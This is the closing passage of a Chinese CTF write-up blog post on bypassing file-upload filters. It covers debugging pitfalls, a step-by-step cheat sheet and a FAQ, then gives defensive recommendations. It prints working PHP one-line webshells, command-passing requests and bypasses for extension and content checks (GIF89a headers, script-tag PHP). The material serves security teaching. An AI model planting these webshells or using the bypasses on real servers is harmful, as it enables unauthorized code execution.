+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;js_webshell.phtml&quot;) = 919539e3b40ca50dc6764a318ad61c1f</span><br></pre></td></tr></table></figure>
+
+<mark class="label success">正确做法</mark> 上传前一定在编辑器里打开看一眼内容。文件名叫 `webshell` 不代表它是 webshell。
+
+<h3 id="坑-3：eval-执行的是-PHP，不是系统命令"><a href="#坑-3：eval-执行的是-PHP，不是系统命令" class="headerlink" title="坑 3：eval 执行的是 PHP，不是系统命令"></a>坑 3：<code>eval</code> 执行的是 PHP，不是系统命令</h3><mark class="label danger">现象</mark> 木马是
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传 <code>shell=ls -al</code>，页面白屏或报错。</p>
+<mark class="label warning">原因</mark> `eval()` 执行的是 **PHP 代码**，`ls -al` 不是 PHP 语法，直接 Parse error。
+
+<p>另外 <code>&lt;script language=php&gt;</code> 是 PHP 5 时代的老式标签，值的引号写法在部分版本里还会影响识别，PHP 7.0 已经彻底移除。靶机恰好是 PHP 5.6.40 才没在这里翻车。</p>
+<mark class="label success">正确做法</mark> 要执行命令就用 `system()`：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者保持 <code>eval</code>，那传进去的必须是 PHP 代码：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=system(&#x27;ls -al&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="坑-4：变量函数调用和-system-混用"><a href="#坑-4：变量函数调用和-system-混用" class="headerlink" title="坑 4：变量函数调用和 system(...) 混用"></a>坑 4：变量函数调用和 <code>system(...)</code> 混用</h3><mark class="label danger">现象</mark>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Function name must be a string in</span><br><span class="line">/var/www/html/uplo4d/919539e3b40ca50dc6764a318ad61c1f.phtml on line 1</span><br></pre></td></tr></table></figure>
+
+<p>请求是 <code>?shell=system(&#39;ls -al;&#39;)</code>。</p>
+<mark class="label warning">原因</mark> 木马写成了变量函数：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>](); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 会把 <code>$_GET[&#39;shell&#39;]</code> 的<strong>值</strong>当成函数名，也就是说它试图调用一个名叫 <code>system(&#39;ls -al;&#39;)</code> 的函数。函数名里不能带括号和参数，于是报错。</p>
+<mark class="label success">正确做法</mark> 两种风格别混：
+
+<table>
+<thead>
+<tr>
+<th>木马内容</th>
+<th>传参方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php system($_GET[&#39;shell&#39;]); ?&gt;</code></td>
+<td><code>?shell=ls -al</code></td>
+<td>只传命令本身</td>
+</tr>
+<tr>
+<td><code>&lt;?php eval($_GET[&#39;shell&#39;]); ?&gt;</code></td>
+<td><code>?shell=system(&#39;ls -al&#39;);</code></td>
+<td>传 PHP 代码</td>
+</tr>
+<tr>
+<td><code>&lt;?php $_GET[&#39;shell&#39;](); ?&gt;</code></td>
+<td><code>?shell=system</code></td>
+<td>只传函数名，参数得另外传</td>
+</tr>
+</tbody></table>
+<h3 id="坑-5：URL-里的特殊字符没编码"><a href="#坑-5：URL-里的特殊字符没编码" class="headerlink" title="坑 5：URL 里的特殊字符没编码"></a>坑 5：URL 里的特殊字符没编码</h3><mark class="label danger">现象</mark> 带空格的命令（`ls -al`）传过去被截断或参数错乱。
+
+<mark class="label warning">原因</mark> GET 参数在地址栏里传输，空格、`&`、`#`、`+` 都有自己的含义。
+
+<mark class="label success">正确做法</mark> 空格写成 `%20`；或者干脆用 POST，在浏览器控制台里发：
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/uplo4d/xxx.phtml&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;shell=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;ls -al /&#x27;</span>)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="坑-6：把“上传成功”当成“木马可用”"><a href="#坑-6：把“上传成功”当成“木马可用”" class="headerlink" title="坑 6：把“上传成功”当成“木马可用”"></a>坑 6：把“上传成功”当成“木马可用”</h3><mark class="label danger">现象</mark> 提示 `Upload Success`，但访问没反应。
+
+<mark class="label warning">原因</mark> 上传成功只说明**文件写进去了**，不代表后缀会被解析、也不代表文件内容是有效的 PHP。
+
+<mark class="label success">正确做法</mark> 按这个顺序验证：
+
+<ol>
+<li>文件内容是否正确（打开看一眼）；</li>
+<li>后缀是否会被解析（先传 <code>&lt;?php echo &quot;test123&quot;; ?&gt;</code> 试一下）；</li>
+<li>路径是否正确（md5 算一下，或看回显）；</li>
+<li>最后才上命令执行。</li>
+</ol>
+<h3 id="坑-7：后缀拼错，上传“成功”却永远不解析"><a href="#坑-7：后缀拼错，上传“成功”却永远不解析" class="headerlink" title="坑 7：后缀拼错，上传“成功”却永远不解析"></a>坑 7：后缀拼错，上传“成功”却永远不解析</h3><mark class="label danger">现象</mark> 传 `up.phmtl`，提示上传成功，访问后页面只有一个 `GIF89a`，命令怎么都执行不了。
+
+<mark class="label warning">原因</mark> 黑名单拦的是 `php` 这类后缀，`phmtl` 不在名单里，所以顺利落盘；可服务器同样不认识 `phmtl`，不会交给 PHP 解析。**“不在黑名单里”和“会被解析”是两回事。**
+
+<mark class="label success">正确做法</mark> 构造请求前核对一遍后缀拼写。拿不准就把可执行后缀挨个试一遍（`phtml`、`pht`、`php5`、`php7`……），先用 `echo` 版本确认能解析，再上真 payload。
+
+<h3 id="坑-8：只看到-GIF89a，判断不了到底执行没执行"><a href="#坑-8：只看到-GIF89a，判断不了到底执行没执行" class="headerlink" title="坑 8：只看到 GIF89a，判断不了到底执行没执行"></a>坑 8：只看到 <code>GIF89a</code>，判断不了到底执行没执行</h3><mark class="label danger">现象</mark> 访问 `up.phtml`，页面除了文件头 `GIF89a` 什么都没有。
+
+<mark class="label warning">原因</mark> 两种情况在页面上长得一模一样：一种是被当静态文件原样返回；另一种是 PHP 确实执行了，但 `eval` 没收到参数、什么也没输出，页面剩下的只有文件头文本。
+
+<mark class="label success">正确做法</mark> 别靠“页面有没有变化”猜。直接带参数发一次请求（`a=system('id');`），有输出才算执行；没输出再看响应头里有没有 `X-Powered-By: PHP`。
+
+<h2 id="完整流程速查表"><a href="#完整流程速查表" class="headerlink" title="完整流程速查表"></a>完整流程速查表</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>看前端拦什么</td>
+<td>读 <code>js/main.js</code>，确认是白名单还是黑名单</td>
+</tr>
+<tr>
+<td>2</td>
+<td>绕过前端</td>
+<td>禁用 JS &#x2F; 覆盖函数 &#x2F; 删 <code>onsubmit</code> &#x2F; curl</td>
+</tr>
+<tr>
+<td>3</td>
+<td>摸后端黑名单</td>
+<td>同一内容换后缀逐个试，看返回</td>
+</tr>
+<tr>
+<td>4</td>
+<td>摸内容检查</td>
+<td>回显 <code>not image</code> → 加 <code>GIF89a</code>；回显 <code>included &#39;&lt;?&#39;</code> → 换 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>判断是否解析</td>
+<td>访问可执行后缀，再带参数确认</td>
+</tr>
+<tr>
+<td>6</td>
+<td>找根因</td>
+<td>读 <code>.htaccess</code> &#x2F; <code>httpd.conf</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>传马</td>
+<td><code>GIF89a</code> + 一句话 &#x2F; <code>system()</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>定位文件</td>
+<td>回显路径，或 <code>md5(原文件名).后缀</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>执行命令</td>
+<td><code>?c=id</code>、<code>?c=cat /flag</code></td>
+</tr>
+</tbody></table>
+<div class="note default"><p><strong>打印版口诀</strong>：看前端拦什么 → 绕过前端 → 摸黑名单 → 摸内容检查 → 判解析 → 传马 → 定位 → 执行。</p>
+</div>
+
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><details class="note info"><summary><p><strong>Q1：页面只能点按钮，我怎么传 <code>.phtml</code>？</strong></p>
+</summary>
+<p>前端校验只是浏览器里的 JS，禁用 JS 或用开发者工具改请求就行。见 1.3。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q2：<code>.phtml</code> 传上去了，为什么还是当文本显示？</strong></p>
+</summary>
+<p>看响应头。如果 <code>Content-Type: image/gif</code>、没有 <code>X-Powered-By: PHP</code>，说明服务器没把它当 PHP 解析。多半是缺少 <code>.htaccess</code> 里的 Handler 映射。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q3：文件明明传成功了，访问却 404？</strong></p>
+</summary>
+<p>先看回显路径。这类靶场常常把文件名改成 <code>md5(原文件名)</code>，路径和你想的不一样。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q4：用 <code>eval</code> 为什么不执行 <code>ls</code>？</strong></p>
+</summary>
+<p><code>eval</code> 执行 PHP 代码，不执行系统命令。用 <code>system()</code> &#x2F; <code>exec()</code> &#x2F; <code>shell_exec()</code>。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q5：报 <code>Function name must be a string</code>？</strong></p>
+</summary>
+<p>变量函数调用 <code>$f()</code> 只认函数名，不能把 <code>system(&#39;...&#39;)</code> 整个塞进去。见坑 4。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q6：靶场地址打不开了？</strong></p>
+</summary>
+<p>这类在线靶场地址是临时分配的，过期就失效。可以本地搭 upload-labs 练习，思路完全一样。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q7：提示 <code>NO! HACKER! your file included &lt;?</code> 怎么办？</strong></p>
+</summary>
+<p>内容里有 <code>&lt;?</code>，被字符串黑名单拦了。换一个不含 <code>&lt;?</code> 的等价写法，比如 PHP 5 的 <code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code>。见 2.5。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q8：页面只回显 <code>GIF89a</code>，木马到底生效了吗？</strong></p>
+</summary>
+<p>看页面判断不了：可能后缀根本不解析，也可能执行了但没传参。带参数请求一次才有结论。见坑 8。</p>
+
+</details>
+
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><strong>上传目录禁止执行脚本</strong></td>
+<td>Nginx&#x2F;Apache 里关闭上传目录的脚本解析，这一条最关键</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>用白名单，不用黑名单</strong></td>
+<td>只允许 <code>jpg/png/gif</code>，其他一律拒绝</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>按内容重命名</strong></td>
+<td>不要用用户提交的文件名，随机化且不保留用户可控后缀</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>校验真实文件类型</strong></td>
+<td><code>getimagesize()</code> &#x2F; <code>finfo</code> 检查 magic bytes，而不是只看 <code>Content-Type</code></td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>不要回显存储路径</strong></td>
+<td><code>Upload Success! Look here~ ./uplo4d/xxx</code> 这种提示等于把路铺好了</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>不要用字符串黑名单拦内容</strong></td>
+<td>拦 <code>&lt;?</code> 只是自欺欺人：<code>&lt;script language=&quot;php&quot;&gt;</code>、短标签都能绕，黑名单永远列不全</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>限制大小和数量</strong></td>
+<td>避免被当成存储滥用</td>
+</tr>
+</tbody></table>
+<div class="note success"><p>如果只能做一件事，就做第一条：<strong>让上传目录里的文件不能被解析。</strong> 这一步做对，后面传什么都不成立。</p>
+</div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两篇写下来，文件上传的完整链路基本都覆盖到了：</p>
+<ul>
+<li><strong>前端校验不是防线</strong>，绕过它只是第一步；</li>
+<li><strong>“能上传”和“能解析”是两件事</strong>，<code>.pht</code> 和 <code>.phtml</code> 的对比就是最好的例子；</li>
+<li><strong>每一层拦截都有它自己的绕过方式</strong>：后缀黑名单靠漏网后缀，图片头检查靠 <code>GIF89a</code>，内容黑名单靠 <code>&lt;?</code> 的等价写法；</li>
+<li><strong>黑名单天然有遗漏</strong>，而 <code>.htaccess</code> 往往才是决定“为什么偏偏是这个后缀”的最后一环；</li>
+<li><strong>调试时先确认变量</strong>：文件内容对不对、路径对不对、后缀解析不解析，逐层排除，比一上来就怀疑 payload 有效得多。</li>
+</ul>
+<blockquote>
+<p>通用套路可以记成一句话：</p>
+<p><strong>看前端 → 绕后端 → 判解析 → 传马 → 定位路径 → 执行命令</strong></p>
+</blockquote>
+<div class="note info"><p>这个主题还会继续补充更多题目。后续题目会按同样的结构单独成篇，方便放在一起对比不同靶场的过滤思路。</p>
+</div>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+              <a href="/tags/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" rel="tag"># 后缀绕过</a>
+              <a href="/tags/htaccess/" rel="tag"># .htaccess</a>
+              <a href="/tags/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" rel="tag"># 入门基础</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BC%AA%E9%80%A0/" rel="tag"># 文件头伪造</a>
+              <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag"># 一句话木马</a>
+              <a href="/tags/PHP-%E7%9F%AD%E6%A0%87%E7%AD%BE/" rel="tag"># PHP 短标签</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/22/web-ctf-sql-easysql-suctf/" rel="prev" title="[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码">
+                  <i class="fa fa-angle-left"></i> [SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/24/web-ctf-upload-actf2020/" rel="next" title="[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml">
+                  [ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Quellisya</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/Quellisya" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
